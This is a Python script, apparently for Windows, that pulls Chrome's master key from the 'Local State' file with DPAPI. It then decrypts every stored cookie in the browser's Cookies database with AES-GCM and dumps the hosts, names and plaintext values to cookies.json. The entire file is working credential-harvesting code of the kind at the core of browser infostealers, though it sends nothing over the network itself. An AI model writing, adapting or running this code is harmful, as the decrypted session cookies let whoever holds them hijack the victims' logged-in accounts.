import os
import json
import base64
import shutil
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import datetime

def get_chrome_master_key():
    local_state_path = os.path.join(
        os.environ['USERPROFILE'],
        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_cookie(encrypted_value, master_key):
    try:
        if encrypted_value[:3] == b'v10':
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            return decrypted
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"[Decryption error: {e}]"

def fetch_cookies():
    cookie_db_path = os.path.join(
        os.environ['USERPROFILE'],
        "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies"
    )
    temp_db = "cookies_temp.db"
    shutil.copy2(cookie_db_path, temp_db)

    master_key = get_chrome_master_key()

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")

    cookies = []
    for host, name, encrypted_value, path, expires in cursor.fetchall():
        decrypted_value = decrypt_cookie(encrypted_value, master_key)
        cookies.append({
            "host": host,
            "name": name,
            "value": decrypted_value,
            "path": path,
            "expires": str(expires)
        })

    conn.close()
    os.remove(temp_db)

    with open("cookies.json", "w", encoding="utf-8") as f:
        json.dump(cookies, f, indent=2)

    print(f"✅ Cookies exported to cookies.json ({len(cookies)} entries)")

if __name__ == "__main__":
    fetch_cookies()
